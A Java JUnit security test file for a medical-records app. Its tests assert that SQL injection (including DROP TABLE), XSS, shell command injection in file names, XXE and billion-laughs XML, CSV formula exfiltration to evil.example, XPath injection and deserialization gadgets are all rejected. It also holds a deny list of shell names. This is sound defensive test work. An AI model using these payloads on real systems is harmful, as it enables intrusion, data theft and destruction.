package medvault.records;

import medvault.access.AccessPolicy;
import medvault.access.InMemoryCareTeam;
import medvault.audit.AuditLogger;
import medvault.audit.LogSanitizer;
import medvault.auth.SessionManager;
import medvault.model.AccessDeniedException;
import medvault.model.Patient;
import medvault.model.Role;
import medvault.model.Session;
import medvault.model.User;
import medvault.model.ValidationException;
import medvault.security.CryptoService;
import medvault.security.TokenGenerator;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.w3c.dom.Document;

import javax.crypto.KeyGenerator;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.time.Clock;
import java.time.Instant;
import java.time.LocalDate;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.UUID;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.logging.Handler;
import java.util.logging.LogRecord;
import java.util.logging.Logger;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Attack tests for the records package. Each test attempts the attack for one
 * CWE and asserts it fails; {@link #legitimateChartLifecycleWorks()} shows the
 * normal case works. Each test gets its own in-memory H2 database and real
 * {@link SessionManager}, {@link AccessPolicy} and {@link CryptoService}.
 *
 * @author James Strickert
 */
class RecordsAttackTest {

    private final TokenGenerator random = new TokenGenerator();
    private final SessionManager sessions = new SessionManager(random, Clock.systemUTC());
    private final InMemoryCareTeam careTeam = new InMemoryCareTeam();
    private final AuditLogger audit = new AuditLogger(new LogSanitizer());
    private final AccessPolicy policy = new AccessPolicy(sessions, careTeam, audit);

    private Database db;
    private CryptoService crypto;
    private JdbcPatientRepository repo;
    private Session doctor;
    private Session otherDoctor;
    private Session nurse;
    private Patient alice;
    private Patient bob;
    private Patient percent;

    private final List<String> auditLines = Collections.synchronizedList(new ArrayList<>());
    private final Logger auditLog = Logger.getLogger("medvault.audit");
    private final Handler capture = new Handler() {
        @Override
        public void publish(LogRecord record) {
            auditLines.add(record.getMessage());
        }

        @Override
        public void flush() {
        }

        @Override
        public void close() {
        }
    };

    @BeforeEach
    void setUp() throws Exception {
        auditLog.addHandler(capture);
        auditLog.setUseParentHandlers(false);
        // A unique database per test, so tests can't see each other's rows.
        db = new Database("jdbc:h2:mem:records-" + UUID.randomUUID() + ";DB_CLOSE_DELAY=-1", "sa",
                "test-only".toCharArray());
        db.createSchema();
        KeyGenerator gen = KeyGenerator.getInstance("AES");
        gen.init(256);
        crypto = new CryptoService(gen.generateKey(), random);
        repo = new JdbcPatientRepository(db, crypto, policy, audit);

        doctor = sessions.create(new User("dr.grey", Role.DOCTOR));
        otherDoctor = sessions.create(new User("dr.house", Role.DOCTOR));
        nurse = sessions.create(new User("nurse.joy", Role.NURSE));
        alice = repo.add(doctor, new Patient(0, "Alice Example", LocalDate.of(1980, 1, 31), "dr.grey",
                "HIV positive; started antiretrovirals."));
        bob = repo.add(doctor, new Patient(0, "Bob Sample", LocalDate.of(1975, 6, 15), "dr.grey", "Hypertension."));
        percent = repo.add(doctor, new Patient(0, "100% Tester_X", LocalDate.of(1990, 2, 2), "dr.grey", ""));
        for (Patient p : List.of(alice, bob, percent)) {
            careTeam.assign(p.getId(), "dr.grey");
        }
        careTeam.assign(alice.getId(), "nurse.joy");
        careTeam.assign(percent.getId(), "nurse.joy");
        careTeam.assign(alice.getId(), "dr.house"); // on the team, but not the owner
        auditLines.clear();
    }

    @AfterEach
    void tearDown() {
        auditLog.removeHandler(capture);
        auditLog.setUseParentHandlers(true);
    }

    private int rowCount() throws Exception {
        try (Connection c = db.connect();
             PreparedStatement ps = c.prepareStatement("SELECT COUNT(*) FROM patient");
             ResultSet rs = ps.executeQuery()) {
            rs.next();
            return rs.getInt(1);
        }
    }

    // ---- Legitimate case ----

    @Test
    void legitimateChartLifecycleWorks() throws Exception {
        assertEquals("Alice Example", repo.findById(nurse, alice.getId()).orElseThrow().getFullName());
        assertEquals("HIV positive; started antiretrovirals.",
                repo.findById(doctor, alice.getId()).orElseThrow().getClinicalNotes());
        assertTrue(repo.findById(doctor, 9_999).isEmpty());
        List<Patient> found = repo.searchByName(nurse, "Ali");
        assertEquals(1, found.size());
        assertEquals(alice.getId(), found.get(0).getId());

        repo.update(doctor, alice.withNotes("Viral load undetectable."));
        assertEquals("Viral load undetectable.", repo.findById(nurse, alice.getId()).orElseThrow().getClinicalNotes());

        // Notes are AES-GCM ciphertext in the table, not plaintext.
        try (Connection c = db.connect();
             PreparedStatement ps = c.prepareStatement("SELECT notes_encrypted FROM patient WHERE id = ?")) {
            ps.setLong(1, alice.getId());
            try (ResultSet rs = ps.executeQuery()) {
                assertTrue(rs.next());
                String stored = rs.getString(1);
                assertFalse(stored.contains("Viral"), stored);
                assertEquals("Viral load undetectable.", crypto.decrypt(stored));
            }
        }
        // Audit lines carry ids only: no names, notes or search text.
        for (String line : auditLines) {
            for (String phi : List.of("Alice", "Ali", "HIV", "Viral")) {
                assertFalse(line.contains(phi), "leaked '" + phi + "' in " + line);
            }
        }
        assertTrue(auditLines.stream().anyMatch(l -> l.contains("action=CHART_READ") && l.contains("patient=")));
    }

    @Test
    void repositoryEnforcesCareTeamAndOwnership() {
        // CWE-639 through the repository: the nurse changes the id to Bob's chart.
        assertThrows(AccessDeniedException.class, () -> repo.findById(nurse, bob.getId()));
        // Search only returns charts she may read.
        assertTrue(repo.searchByName(nurse, "Bob").isEmpty());
        // CWE-306: no valid session, no data.
        Session forged = new Session("forged-token", new User("dr.grey", Role.DOCTOR),
                Instant.now().plusSeconds(600));
        assertThrows(AccessDeniedException.class, () -> repo.findById(forged, alice.getId()));
        assertThrows(AccessDeniedException.class, () -> repo.searchByName(forged, ""));
        // CWE-283: a consulting doctor on the team can read but not edit; the client can't
        // claim ownership by sending a chart object with itself as attending.
        assertTrue(repo.findById(otherDoctor, alice.getId()).isPresent());
        assertThrows(AccessDeniedException.class, () -> repo.update(otherDoctor, alice.withNotes("x")));
        Patient hijack = new Patient(alice.getId(), "Alice Example", alice.getDateOfBirth(), "dr.house", "x");
        assertThrows(AccessDeniedException.class, () -> repo.update(otherDoctor, hijack));
        assertThrows(ValidationException.class, () -> repo.update(doctor, hijack), "ownership can't move");
        assertThrows(AccessDeniedException.class, () -> repo.update(nurse, alice.withNotes("x")));
        assertThrows(AccessDeniedException.class, () -> repo.add(doctor,
                new Patient(0, "New Person", LocalDate.of(2000, 1, 1), "dr.house", "")),
                "can't create a chart owned by someone else");
        assertEquals("HIV positive; started antiretrovirals.",
                repo.findById(doctor, alice.getId()).orElseThrow().getClinicalNotes(), "nothing changed");
    }

    // ---- CWE-89: SQL Injection ----

    @Test
    void sqlInjectionInSearchReturnsNothingExtra() throws Exception {
        for (String attack : List.of("' OR 1=1 --", "' OR '1'='1", "x' UNION SELECT id, full_name, date_of_birth,"
                + " attending, notes_encrypted FROM patient --", "'; DROP TABLE patient; --", "%", "_", "%%", "\\",
                "%' --")) {
            assertTrue(repo.searchByName(doctor, attack).isEmpty(), "attack returned rows: " + attack);
        }
        assertEquals(3, rowCount(), "table intact after the DROP attempt");
        // Wildcards are literal: "100%" matches only the chart whose name really contains "100%",
        // and "100% Tester_" matches the underscore literally.
        assertEquals(List.of(percent.getId()), repo.searchByName(doctor, "100%").stream().map(Patient::getId).toList());
        assertEquals(1, repo.searchByName(doctor, "100% Tester_").size());
        assertEquals("a\\%b\\_c\\\\d", JdbcPatientRepository.escapeLike("a%b_c\\d"));
        // Legitimate: the empty prefix lists what the doctor may read.
        assertEquals(3, repo.searchByName(doctor, "").size());
        assertThrows(ValidationException.class, () -> repo.searchByName(doctor, "x".repeat(201)));
    }

    // ---- CWE-79: Cross-site Scripting ----

    @Test
    void exportEscapesScriptTags() {
        RecordExporter exporter = new RecordExporter();
        Patient evil = new Patient(7, "\"><img src=x onerror=alert(1)>", LocalDate.of(1980, 1, 1),
                "' onmouseover='steal()", "<script>alert(1)</script> & BP 120/80");
        String html = exporter.toHtml(evil);
        assertFalse(html.contains("<script"), html);
        assertFalse(html.contains("<img"), html);
        assertFalse(html.contains("' onmouseover"), html);
        assertTrue(html.contains("&lt;script&gt;alert(1)&lt;/script&gt; &amp; BP 120/80"), html);
        assertTrue(html.contains("&quot;&gt;&lt;img src=x onerror=alert(1)&gt;"), html);
        assertTrue(html.contains("&#39; onmouseover=&#39;steal()"), html);
        assertTrue(html.contains("Content-Security-Policy"), "defense in depth: no scripts allowed");
        assertEquals("&amp;lt;", RecordExporter.escapeHtml("&lt;"), "& is escaped first, so no double meaning");

        // Legitimate: ordinary text comes through unchanged.
        String plain = exporter.toHtml(alice);
        assertTrue(plain.startsWith("<!DOCTYPE html>"));
        assertTrue(plain.contains("Alice Example") && plain.contains("1980-01-31") && plain.contains("dr.grey"));
    }

    // ---- CWE-78: OS Command Injection ----

    @Test
    void printerNeverUsesAShell(@TempDir Path dir) {
        ReportPrinter printer = new ReportPrinter();
        // Shell metacharacters that are legal in file names on both Windows and Linux.
        Path hostile = dir.resolve("x; rm -rf ~ & calc.exe && $(id) `whoami`.html");
        Path dashed = Path.of("-o-option-injection.html");
        for (Path input : List.of(hostile, dashed)) {
            List<String> cmd = printer.command(input, dir.resolve("chart-1.pdf"));
            assertEquals(ReportPrinter.TOOL, cmd.get(0), "the program is fixed");
            for (String arg : cmd) {
                String a = arg.toLowerCase();
                for (String shell : List.of("sh", "bash", "cmd", "cmd.exe", "/c", "-c", "powershell", "pwsh")) {
                    assertNotEquals(shell, a, "shell in command: " + cmd);
                }
            }
            // The hostile name stays inside ONE argument: it is data, never parsed as syntax.
            assertEquals(1, cmd.stream().filter(a -> a.contains(input.getFileName().toString())).count(), cmd.toString());
            // File arguments are absolute, so none can start with '-' and become an option.
            List<String> files = cmd.subList(cmd.size() - 2, cmd.size());
            for (String f : files) {
                assertTrue(Path.of(f).isAbsolute(), f);
                assertFalse(f.startsWith("-"), f);
            }
            assertTrue(cmd.contains("--disable-javascript"));
            assertTrue(cmd.contains("--disable-local-file-access"));
        }
        // Legitimate: tool, options, then input and output in that order.
        List<String> cmd = printer.command(dir.resolve("chart.html"), dir.resolve("chart.pdf"));
        assertEquals(dir.resolve("chart.html").toAbsolutePath().toString(), cmd.get(cmd.size() - 2));
        assertEquals(dir.resolve("chart.pdf").toAbsolutePath().toString(), cmd.get(cmd.size() - 1));
    }

    // ---- CWE-611: XML External Entity ----

    private static InputStream xml(String s) {
        return new ByteArrayInputStream(s.getBytes(StandardCharsets.UTF_8));
    }

    @Test
    void xmlWithDoctypeIsRejected(@TempDir Path dir) throws IOException {
        Path secret = dir.resolve("secret.txt");
        Files.writeString(secret, "TOP-SECRET-PASSWD-CONTENT");
        String uri = secret.toUri().toString();
        XmlRecordImporter importer = new XmlRecordImporter();
        List<String> attacks = List.of(
                // classic XXE: read a local file into the document
                "<?xml version=\"1.0\"?><!DOCTYPE patients [<!ENTITY x SYSTEM \"" + uri + "\">]>"
                        + "<patients><patient><name>&x;</name><dob>1990-01-01</dob><attending>a</attending></patient></patients>",
                // parameter-entity / external DTD
                "<?xml version=\"1.0\"?><!DOCTYPE patients SYSTEM \"" + uri + "\"><patients/>",
                "<?xml version=\"1.0\"?><!DOCTYPE patients [<!ENTITY % p SYSTEM \"" + uri + "\"> %p;]><patients/>",
                // "billion laughs" entity expansion
                "<?xml version=\"1.0\"?><!DOCTYPE patients [<!ENTITY a \"aaaaaaaaaa\"><!ENTITY b \"&a;&a;&a;&a;&a;\">]>"
                        + "<patients><patient><name>&b;</name></patient></patients>");
        for (String attack : attacks) {
            assertThrows(ValidationException.class, () -> importer.parse(xml(attack)), attack);
        }
        // XInclude is off: the include element stays an inert element and the file is not pulled in.
        Document xi = importer.parse(xml("<patients xmlns:xi=\"http://www.w3.org/2001/XInclude\">"
                + "<xi:include href=\"" + uri + "\" parse=\"text\"/></patients>"));
        assertFalse(xi.getDocumentElement().getTextContent().contains("TOP-SECRET"));
        // Malformed or foreign documents are rejected too.
        assertThrows(ValidationException.class, () -> importer.parse(xml("<patients><patient>")));
        assertThrows(ValidationException.class, () -> importer.parse(xml("<invoices/>")));
        assertThrows(ValidationException.class, () -> importer.parse(null));
    }

    // ---- CWE-1236: CSV Injection (formula elements in a CSV file) ----

    @Test
    void csvExportNeutralizesFormulas() {
        RecordExporter exporter = new RecordExporter();
        String hyperlink = "=HYPERLINK(\"http://evil.example/?leak=\"&A2,\"Lab results\")";
        Patient evil = new Patient(7, "+cmd|' /C calc'!A0", LocalDate.of(1980, 1, 1), "@SUM(1+1)", hyperlink);
        String csv = exporter.toCsv(List.of(evil));
        String row = csv.split("\r\n")[1];

        // Attack: each cell would run as a formula when the file is opened in a spreadsheet.
        assertTrue(row.contains("\"'=HYPERLINK(\"\"http://evil.example/?leak=\"\"&A2,\"\"Lab results\"\")\""), row);
        assertTrue(row.contains("\"'+cmd|' /C calc'!A0\""), row);
        assertTrue(row.contains("\"'@SUM(1+1)\""), row);
        for (String start : List.of("=", "+", "-", "@", "\t", "\r")) {
            String cell = RecordExporter.csvCell(start + "1+1");
            assertEquals("\"'" + start + "1+1\"", cell, "not neutralized: " + start);
        }

        // Legitimate: ordinary values are unchanged (only quoted), and the header is first.
        assertTrue(csv.startsWith("id,name,date_of_birth,attending,notes\r\n"));
        assertEquals("\"Alice Example\"", RecordExporter.csvCell("Alice Example"));
        assertEquals("\"BP 120/80, stable\"", RecordExporter.csvCell("BP 120/80, stable"));
        assertEquals("\"a=b\"", RecordExporter.csvCell("a=b"), "= in the middle is harmless");
        assertTrue(exporter.toCsv(List.of(alice)).contains("\"" + alice.getId() + "\",\"Alice Example\",\"1980-01-31\""));
    }

    // ---- XPath lookup with a bound variable (defense in depth; not one of the team's CWEs) ----

    private static final String IMPORT = "<patients>"
            + "<patient id=\"9\"><name>Dan Import</name><dob>1990-01-01</dob><attending>dr.grey</attending>"
            + "<notes>Transferred.</notes></patient>"
            + "<patient id=\"10\"><name>Erin O'Brien</name><dob>1985-05-05</dob><attending>dr.grey</attending></patient>"
            + "</patients>";

    @Test
    void xpathLookupIsParameterized() {
        XmlRecordImporter importer = new XmlRecordImporter();
        Document doc = importer.parse(xml(IMPORT));
        for (String attack : List.of("x' or '1'='1", "' or name!='", "x\" or \"1\"=\"1",
                "x'] | //patient | //*['", "*", "")) {
            assertTrue(importer.findByName(doc, attack).isEmpty(), "attack matched: " + attack);
        }
        // Legitimate: exact match, including a name with an apostrophe (which breaks string-built XPath).
        List<Patient> dan = importer.findByName(doc, "Dan Import");
        assertEquals(1, dan.size());
        assertEquals(9, dan.get(0).getId());
        assertEquals(LocalDate.of(1990, 1, 1), dan.get(0).getDateOfBirth());
        assertEquals("Transferred.", dan.get(0).getClinicalNotes());
        assertEquals(10, importer.findByName(doc, "Erin O'Brien").get(0).getId());
    }

    // ---- CWE-502: Deserialization of Untrusted Data ----

    /** Stands in for a gadget class: running its readObject would be the attacker's code running. */
    static final class Gadget implements Serializable {
        private static final long serialVersionUID = 1L;
        static final AtomicBoolean RAN = new AtomicBoolean();

        private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
            in.defaultReadObject();
            RAN.set(true);
        }
    }

    @Test
    void restoreRejectsUnexpectedTypes() throws Exception {
        BackupService backups = new BackupService();
        Gadget.RAN.set(false);
        ByteArrayOutputStream serialized = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(serialized)) {
            oos.writeObject(new Gadget());
        }
        assertThrows(ValidationException.class, () -> backups.restore(new ByteArrayInputStream(serialized.toByteArray())));
        assertFalse(Gadget.RAN.get(), "restore must never deserialize objects");

        // Tampered text backups are refused field by field.
        String header = BackupService.MAGIC + ",1,plain\n" + BackupService.COLUMNS + "\n";
        for (String bad : List.of("", "java.util.HashMap\n", BackupService.MAGIC + ",2,plain\n",
                header + "\"1\",\"A\",\"1990-01-01\",\"dr.grey\",\"\",\"extra\"\n",
                header + "\"x\",\"A\",\"1990-01-01\",\"dr.grey\",\"\"\n",
                header + "\"1\",\"A\",\"yesterday\",\"dr.grey\",\"\"\n",
                header + "\"1\",\"A\",\"1990-01-01\",\"dr grey; DROP\",\"\"\n",
                header + "\"1\",\"A\",\"1990-01-01\",\"dr.grey\",\"unterminated\n")) {
            assertThrows(ValidationException.class,
                    () -> backups.restore(new ByteArrayInputStream(bad.getBytes(StandardCharsets.UTF_8))), bad);
        }
    }

    @Test
    void legitimateBackupRoundTrips() {
        Patient tricky = new Patient(42, "Zoë \"Zed\" O'Neil, Jr.", LocalDate.of(1970, 12, 31), "dr.grey",
                "line one, with comma\nline \"two\"\r\nline three");
        List<Patient> charts = List.of(alice, tricky);

        BackupService plain = new BackupService();
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        plain.backup(charts, out);
        assertSame(charts, plain.restore(new ByteArrayInputStream(out.toByteArray())));

        // The app's backups keep notes encrypted.
        BackupService sealed = new BackupService(crypto);
        ByteArrayOutputStream enc = new ByteArrayOutputStream();
        sealed.backup(charts, enc);
        String text = enc.toString(StandardCharsets.UTF_8);
        assertFalse(text.contains("HIV") || text.contains("line one"), text);
        assertSame(charts, sealed.restore(new ByteArrayInputStream(enc.toByteArray())));
        assertThrows(ValidationException.class, () -> plain.restore(new ByteArrayInputStream(enc.toByteArray())),
                "an encrypted backup needs the key");
    }

    private static void assertSame(List<Patient> expected, List<Patient> actual) {
        assertEquals(expected.size(), actual.size());
        for (int i = 0; i < expected.size(); i++) {
            Patient e = expected.get(i);
            Patient a = actual.get(i);
            assertEquals(e.getId(), a.getId());
            assertEquals(e.getFullName(), a.getFullName());
            assertEquals(e.getDateOfBirth(), a.getDateOfBirth());
            assertEquals(e.getAttendingClinician(), a.getAttendingClinician());
            assertEquals(e.getClinicalNotes(), a.getClinicalNotes());
        }
    }
}
